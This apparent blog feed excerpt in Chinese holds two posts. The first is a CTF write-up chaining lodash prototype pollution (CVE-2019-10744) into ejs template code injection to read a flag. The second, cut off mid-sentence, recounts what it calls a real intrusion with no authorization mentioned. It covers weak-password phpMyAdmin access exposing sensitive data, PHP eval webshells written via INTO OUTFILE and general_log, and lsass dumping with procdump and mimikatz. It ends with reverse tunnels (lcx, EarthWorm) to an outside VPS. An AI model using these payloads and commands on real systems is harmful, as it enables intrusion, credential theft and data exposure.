    <content type="html"><![CDATA[<p>点击阅读</p><a id="more"></a><h2 id="0x01-基本知识"><a href="#0x01-基本知识" class="headerlink" title="0x01 基本知识"></a>0x01 基本知识</h2><p>在 JavaScript 中有一点与 Python 一样，那就是 “一切皆对象”</p><p>对象的定义：</p><p><strong>1.</strong> 直接定义一个对象</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/js_prototype_pollution.assets/H2bGIxaKB9tNlgO.png" alt></p><p>这种方式无需使用类模版，也就是类似以下这种定义：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Object</span><span class="params">()</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">Ob1 = Object()</span><br><span class="line">Ob2 = Object()</span><br></pre></td></tr></table></figure><p><strong>2.</strong> 使用构造函数定义类模版</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/js_prototype_pollution.assets/fqEeP2kwoOizurJ.png" alt></p><p>这样方便批量实例化对象</p><p>对象的属性通过<strong>方括号</strong>或<strong><code>.</code></strong>来访问</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/js_prototype_pollution.assets/oajI5NRqYOyn4bJ.png" alt></p><h3 id="prototype-原型"><a href="#prototype-原型" class="headerlink" title="prototype (原型)"></a>prototype (原型)</h3><p>在 ES4 中对 prototype 有这样的描述：</p><blockquote><p>每个类对象都有一个常量属性原型，它保存对作为<strong><em>类实例原型的对象</em></strong>的引用，并且每个实例都有一个隐藏的引用到它的原型。原型包含在引用它的所有对象之间共享的值。对象原型上的属性在偶然观察者看来是对象本身的属性：从对象中读取属性将在原型中找到属性（如果在那里定义而不是在对象中）。(Google 翻译)</p></blockquote><p>举个例子：这里我整一个 Array 对象 a1，并给它一个 sum 方法求和</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/js_prototype_pollution.assets/zP64AyKrVe7qScD.png" alt></p><p>能看到 <code>a1.sum()</code> 顺利求和，而同为 Array 对象的 a2 确不行，如果要让所有的 Array 对象都能够拥有 sum 求和方法怎么办，可以通过修改 Array 的原型来实现，添加一个 <code>Array.prototype.sum</code> 即可</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/js_prototype_pollution.assets/2kMArnTQ4RJgpDU.png" alt></p><p>这样应该就很好理解原型了，可以将其看作是 CSS 里面的 class，修改了 class 后，所有使用该 class 的 html 元素的样式都会被改变，无须对每个元素用 style 了</p><h3 id="proto"><a href="#proto" class="headerlink" title="__proto__"></a><code>__proto__</code></h3><p><strong><em>对象<code>__proto__</code>属性的值就是它所对应的原型对象</em></strong></p><p>因为所有实例对象都拥有一个 <code>__proto__</code>，用于访问其原型对象，而原型对象又引出它的原型对象, 这么一层层的调用下来就构成了 “原型链”</p><p>接着上面的例子，调用到最后没有了原型对象便是 <code>NULL</code> 了</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/js_prototype_pollution.assets/LtPQh8GWOSdmTUy.png" alt></p><p>创建函数时，JS 会为这个函数自动添加 prototype 属性，值是一个有 constructor 属性的对象。而一旦你把这个函数当作构造函数（constructor）调用（即通过new关键字调用），那么 JS 就会帮你创建该构造函数的实例，实例继承构造函数 prototype 的所有属性和方法（实例通过设置自己的 <code>__proto__</code> 指向构造函数的 prototype 来实现这种继承）</p><p>使用 <code>__proto__</code> 修改原型属性示例</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/js_prototype_pollution.assets/jevcdxBlgP29kSa.png" alt></p><h2 id="0x02-Hardjs"><a href="#0x02-Hardjs" class="headerlink" title="0x02 Hardjs"></a>0x02 Hardjs</h2><p>在安装好依赖后，使用 <code>npm audit</code> 检测依赖有没有漏洞 ，报错的可以试下挂个代理用 proxychains4 后面再加上 <code>--registry=https://registry.npmjs.org</code></p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/js_prototype_pollution.assets/7nxjiz1TuJg4hAH.png" alt></p><p>检测到了 lodash 的一个原型链污染漏洞</p><p>在源码到第 182 行调用了 lodash</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">"/get"</span>,auth,<span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params">req,res,next</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> userid = req.session.userid ; </span><br><span class="line">    <span class="keyword">var</span> sql = <span class="string">"select count(*) count from `html` where userid= ?"</span></span><br><span class="line">    <span class="comment">// var sql = "select `dom` from  `html` where userid=? ";</span></span><br><span class="line">    <span class="keyword">var</span> dataList = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(dataList[<span class="number">0</span>].count == <span class="number">0</span> )&#123;</span><br><span class="line">        res.json(&#123;&#125;)</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(dataList[<span class="number">0</span>].count &gt; <span class="number">5</span>) &#123; <span class="comment">// if len &gt; 5 , merge all and update mysql</span></span><br><span class="line">        </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">"Merge the recorder in the database."</span>); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">"select `id`,`dom` from  `html` where userid=? "</span>;</span><br><span class="line">        <span class="keyword">var</span> raws = <span class="keyword">await</span> query(sql,[userid]);</span><br><span class="line">        <span class="keyword">var</span> doms = &#123;&#125;</span><br><span class="line">        <span class="keyword">var</span> ret = <span class="keyword">new</span> <span class="built_in">Array</span>(); </span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;raws.length ;i++)&#123;</span><br><span class="line">            lodash.defaultsDeep(doms,<span class="built_in">JSON</span>.parse( raws[i].dom ));</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> sql = <span class="string">"delete from `html` where id = ?"</span>;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="keyword">await</span> query(sql,raws[i].id);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> sql = <span class="string">"insert into `html` (`userid`,`dom`) values (?,?) "</span>;</span><br><span class="line">        <span class="keyword">var</span> result = <span class="keyword">await</span> query(sql,[userid, <span class="built_in">JSON</span>.stringify(doms) ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(result.affectedRows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            ret.push(doms);</span><br><span class="line">            res.json(ret);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.json([&#123;&#125;]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">. . .  . . . </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>从 package.json 能看到 lodash 版本为 4.17.11，对应漏洞 CVE-2019-10744，可以利用函数 defaultsDeep 添加或修改 Object.prototype 的属性，漏洞 PoC</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mergeFn = <span class="built_in">require</span>(<span class="string">'lodash'</span>).defaultsDeep;</span><br><span class="line"><span class="keyword">const</span> payload = <span class="string">'&#123;"constructor": &#123;"prototype": &#123;"a0": true&#125;&#125;&#125;'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    mergeFn(&#123;&#125;, <span class="built_in">JSON</span>.parse(payload));</span><br><span class="line">    <span class="keyword">if</span> ((&#123;&#125;)[<span class="string">`a0`</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">`Vulnerable to Prototype Pollution via <span class="subst">$&#123;payload&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">check();</span><br></pre></td></tr></table></figure><p>这里明显就是将构造好的 Payload 数据插入多次，然后访问 /get 即可触发原型链污染，问题是要污染什么地方</p><p>从一开始就引入了 ejs 来渲染模版，那么从 <code>res.render(&#39;index&#39;);</code> 开始分析，Goto Definition 转到定义</p><p>/node_modules/express/lib/response.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">res.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">view, options, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> app = <span class="keyword">this</span>.req.app;</span><br><span class="line">  <span class="keyword">var</span> done = callback;</span><br><span class="line">  <span class="keyword">var</span> opts = options || &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> req = <span class="keyword">this</span>.req;</span><br><span class="line">  <span class="keyword">var</span> self = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line"> . . .  . . . </span><br><span class="line"></span><br><span class="line">  <span class="comment">// render</span></span><br><span class="line">  app.render(view, opts, done);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>调用了 app.render，继续跟</p><p>/node_modules/express/lib/application.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">app.render = <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">name, options, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> cache = <span class="keyword">this</span>.cache;</span><br><span class="line">  <span class="keyword">var</span> done = callback;</span><br><span class="line">  <span class="keyword">var</span> engines = <span class="keyword">this</span>.engines;</span><br><span class="line">  <span class="keyword">var</span> opts = options;</span><br><span class="line">  <span class="keyword">var</span> renderOptions = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> view;</span><br><span class="line"></span><br><span class="line"> . . .   . . .</span><br><span class="line"></span><br><span class="line">  <span class="comment">// render</span></span><br><span class="line">  tryRender(view, renderOptions, done);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>tryRender 同样位于 application.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tryRender</span>(<span class="params">view, options, callback</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    view.render(options, callback);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    callback(err);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟进 view.render </p><p>/node_modules/express/lib/view.js</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">View.prototype.render = function render(options, callback) &#123;</span><br><span class="line">  debug(&apos;render &quot;%s&quot;&apos;, this.path);</span><br><span class="line">  this.engine(this.path, options, callback);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>开始调用模版渲染引擎，这里会根据模版文件后缀自动调用相应的模块，如 View 中有关代码</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// load engine</span></span><br><span class="line"><span class="keyword">var</span> mod = <span class="keyword">this</span>.ext.substr(<span class="number">1</span>)</span><br><span class="line">debug(<span class="string">'require "%s"'</span>, mod)</span><br><span class="line"></span><br><span class="line"><span class="comment">// default engine export</span></span><br><span class="line"><span class="keyword">var</span> fn = <span class="built_in">require</span>(mod).__express</span><br></pre></td></tr></table></figure><p>注意这个默认引擎出口 <code>var fn = require(mod).__express</code>，在 ejs.js 914 行有定义 <code>exports.__express = exports.renderFile;</code>，也就是默认使用 renderFile 函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">exports.renderFile = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> args = <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>);</span><br><span class="line">  <span class="keyword">var</span> filename = args.shift();</span><br><span class="line">  <span class="keyword">var</span> cb;</span><br><span class="line">  <span class="keyword">var</span> opts = &#123;<span class="attr">filename</span>: filename&#125;;</span><br><span class="line">  <span class="keyword">var</span> data;</span><br><span class="line">  <span class="keyword">var</span> viewOpts;</span><br><span class="line">  </span><br><span class="line">. . .  . . . </span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> tryHandleCache(opts, data, cb);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接着调用 tryHandleCache 函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">tryHandleCache</span>(<span class="params">options, data, cb</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> result;</span><br><span class="line">  <span class="keyword">if</span> (!cb) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> exports.promiseImpl == <span class="string">'function'</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> exports.promiseImpl(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">          result = handleCache(options)(data);</span><br><span class="line">          resolve(result);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">          reject(err);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">'Please provide a callback function'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      result = handleCache(options)(data);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">      <span class="keyword">return</span> cb(err);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cb(<span class="literal">null</span>, result);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大体就是经过 handleCache 函数处理后返回最终的页面</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleCache</span>(<span class="params">options, template</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> func;</span><br><span class="line">  <span class="keyword">var</span> filename = options.filename;</span><br><span class="line">  <span class="keyword">var</span> hasTemplate = <span class="built_in">arguments</span>.length &gt; <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  . . .   . . . </span><br><span class="line"></span><br><span class="line">  func = exports.compile(template, options);</span><br><span class="line">  <span class="keyword">if</span> (options.cache) &#123;</span><br><span class="line">    exports.cache.set(filename, func);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> func;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再跟进 compile 看到各种代码拼接 </p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/js_prototype_pollution.assets/YJ4cBru9w7hMZA1.png" alt></p><p>可以利用 outputFunctionName 通过原型链污染注入恶意代码，</p><p>注意 server.js 中这一行 <code>app.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json())</code>，服务器会解析我们发送的 JSON 数据</p><p>通过 constructor 方法给原型加上我们“污染“后的 outputFunctionName 属性</p><p>Payload:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"type"</span>:<span class="string">"111"</span>,<span class="attr">"content"</span>:&#123;<span class="attr">"constructor"</span>:&#123;<span class="attr">"prototype"</span>:&#123;<span class="attr">"outputFunctionName"</span>:<span class="string">"__append; return process.env.FLAG; __append"</span>&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>最终更改 <code>Content-Type: application/json; charset=UTF-8</code> 发送 Payload 执行 /add 操作 5 次，再通过访问 /get 利用 lodash 漏洞进行原型链污染，再回到首页即可返回 flag</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/js_prototype_pollution.assets/4VsQlJ6gAHjimny.png" alt></p><p>Reference:</p><p><a href="https://blog.szfszf.top/tech/javascript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://blog.szfszf.top/tech/javascript-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93-%E5%88%86%E6%9E%90/</a></p><p><a href="https://github.com/creeperyang/blog/issues/9" target="_blank" rel="noopener">https://github.com/creeperyang/blog/issues/9</a></p><p><a href="https://xz.aliyun.com/t/6113#toc-6" target="_blank" rel="noopener">https://xz.aliyun.com/t/6113#toc-6</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读&lt;/p&gt;
    
    </summary>
    
    
      <category term="原型链污染" scheme="http://j0k3r.top/tags/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    
      <category term="JavaScript" scheme="http://j0k3r.top/tags/JavaScript/"/>
    
  </entry>
  
  <entry>
    <title>记一次真实的内网渗透</title>
    <link href="http://j0k3r.top/2019/09/03/Intranet_Penetration/"/>
    <id>http://j0k3r.top/2019/09/03/Intranet_Penetration/</id>
    <published>2019-09-02T16:00:00.000Z</published>
    <updated>2020-03-26T10:19:18.047Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读</p><a id="more"></a><p>直接弱口令进入 phpmyadmin，满满的都是敏感数据</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Intranet_Penetration.assets/fGDN5ybPY74lBqJ.png" alt></p><p>先收集一下信息</p><h2 id="0x01-信息搜集"><a href="#0x01-信息搜集" class="headerlink" title="0x01 信息搜集"></a>0x01 信息搜集</h2><p>MySQL 版本: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@version;</span><br><span class="line">5.5.25a</span><br></pre></td></tr></table></figure><p>OS 版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@version_compile_os</span><br><span class="line">win32</span><br></pre></td></tr></table></figure><p>MySQL 绝对路径, 可借此推测 web 路径: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT @@basedir </span><br><span class="line">D:/xampp/mysql</span><br></pre></td></tr></table></figure><p>看能不能利用 phpmyadmin 报错，爆 web 根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/phpmyadmin/libraries/lect_lang.lib.php</span><br><span class="line">/phpMyAdmin/index.php?lang[]=1</span><br><span class="line">/phpMyAdmin/phpinfo.php</span><br><span class="line">/phpmyadmin/themes/darkblue_orange/layout.inc.php</span><br><span class="line">/phpmyadmin/libraries/select_lang.lib.php</span><br><span class="line">/phpmyadmin/libraries/lect_lang.lib.php</span><br><span class="line">/phpmyadmin/libraries/mcrypt.lib.php</span><br></pre></td></tr></table></figure><p>查看数据导入和导出限制，若其值为 NULL，则不允许导入导出</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show global variables like &apos;secure_file_priv&apos;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT IF( (</span><br><span class="line">SELECT  `VARIABLE_VALUE` </span><br><span class="line">FROM  `GLOBAL_VARIABLES` </span><br><span class="line">WHERE  `VARIABLE_NAME` =  &apos;secure_file_priv&apos; = NULL</span><br><span class="line">),  &apos;Yes&apos;,  &apos;no&apos; )</span><br></pre></td></tr></table></figure><p>官方文档：</p><blockquote><p>secure_file_priv may be set as follows:</p></blockquote><blockquote><p>If empty, the variable has no effect. This is not a secure setting.</p></blockquote><blockquote><p>If set to the name of a directory, the server limits import and export operations to work only with files in that directory. The directory must exist; the server will not create it.</p></blockquote><blockquote><p>If set to NULL, the server disables import and export operations.</p></blockquote><p>secure_file_priv 这个值为只读变量，只能通过配置文件修改. </p><ul><li><p>如果为空，变量无效。</p></li><li><p>如果设置为目录名，服务器将导入和导出操作限制为仅处理该目录中的文件。目录必须存在；服务器不会创建它。</p></li><li><p>如果设置为空，服务器将禁用导入和导出操作。</p></li></ul><p>修改方法： 在mysql 配置文件的 [mysqld] 内加入secure_file_priv</p><h2 id="0x02-利用"><a href="#0x02-利用" class="headerlink" title="0x02 利用"></a>0x02 利用</h2><p>很幸运，这里 secure_file_priv 的值是空，但是还不知道 web 根目录，无法确定 shell 路径，不过根据上面获取的 <code>@@basedir</code> 再根据网站域名盲猜一下成功读取到写入的测试文件</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Intranet_Penetration.assets/XhTMVL4NHEj7PeD.png" alt></p><p><code>into outfile</code> 写 shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT  &apos;&lt;?php @eval($_REQUEST[1]); ?&gt;&apos;</span><br><span class="line">INTO OUTFILE  &apos;D:/xampp/root path/setting_sys.php&apos;</span><br></pre></td></tr></table></figure><p>如果 secure_file_priv 的值为 NULL，在数据导入导出限制的情况下可以利用 log 日志写 shell，条件是需要 mysql 的 root 用户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set global general_log = &quot;ON&quot;; # 开启 </span><br><span class="line">SET global general_log_file=&apos;/web root path/eval.php&apos;;</span><br><span class="line">select &apos;&lt;?php eval($_REQUEST[1]); ?&gt;&apos;;</span><br></pre></td></tr></table></figure><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Intranet_Penetration.assets/92dDqFX1CJpKRkr.png" alt></p><h2 id="0x03-深入"><a href="#0x03-深入" class="headerlink" title="0x03 深入"></a>0x03 深入</h2><p><code>net config Workstation</code> // 获取当前计算机名，全名，用户名，系统版本，工作站域，登陆域</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Intranet_Penetration.assets/bcED1dQ7S4xWVRA.png" alt></p><p>Administrator 很舒服，但是 <code>tasklist /svc</code> 列进程能够看到 ZhuDongFangYu.exe 和 多个 360*.exe</p><p>调整下蚁剑的超时时间，不然稍大一点的文件就很难传上去了</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Intranet_Penetration.assets/FUXMPpIfKvlGCgE.png" alt></p><p>pwdump7 抓 Administrator 的 hash</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Intranet_Penetration.assets/DJpVIFTGSsvXgAO.png" alt></p><p>其中</p><p>用户名称为：Administrator<br>RID为：500 后面跟着 LM-HASH值 和 NT-HASH值</p><p>拿着 hash 去 <a href="https://www.objectif-securite.ch/en/ophcrack.php" target="_blank" rel="noopener">Objectif Sécurité - Ophcrack</a>, cmd5 之类的网站爆一波</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Intranet_Penetration.assets/uiA5rOnjkNJ8VbP.png" alt></p><p>奈何破解不了</p><p>想到 p0desta 表哥一篇 <a href="http://p0desta.com/2019/07/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E6%9C%89%E8%B6%A3%E7%9A%84%E6%B8%97%E9%80%8F/" target="_blank" rel="noopener">记一次有趣的渗透</a> </p><p>使用官方免杀的 procdump.exe 导出lsass进程的内存数据，再配合 mimikatz 本地抓取密码</p><p><code>procdump.exe -accepteula -ma lsass.exe -o crack.dmp</code></p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Intranet_Penetration.assets/trSMQ8ia1CT4Khm.png" alt></p><p>下载下来，拿出封存已久的 mimikatz</p><p>抓取密码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">mimikatz # sekurlsa::minidump crack.dmp</span><br><span class="line">mimikatz # sekurlsa::logonPasswords full</span><br></pre></td></tr></table></figure><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Intranet_Penetration.assets/sv3r7dxbUpmgljQ.png" alt></p><p>这就拿到了 Administrator 的密码，因为这个 windows 只有一个内网 IP，但是发现开了 3389，外部虽无法直接连接，但是可以通过端口转发建立代理连接</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/Intranet_Penetration.assets/8PYEFTUVWgiZtLb.png" alt></p><h4 id="几个代理工具"><a href="#几个代理工具" class="headerlink" title="几个代理工具"></a>几个代理工具</h4><p><strong>1. lcx &amp; portmap</strong></p><p>windows:</p><p><code>lcx.exe -slave vps 7777 127.0.0.1 3389</code></p><p>vps:</p><p><code>./portmap -m 2 -p1 7777 -p2 8888</code></p><p>会被 360 查杀</p><p><strong>2. EarthWorm</strong></p><p>windows:</p><p><code>ew_for_Win.exe -s rssocks -d 152.136.210.126 -e 8888</code></p><p>vps:</p><p><code>./ew_for_linux64 -s rcsocks -l 1080 -e 8888</code></p><p>这个 ew_for_linux64 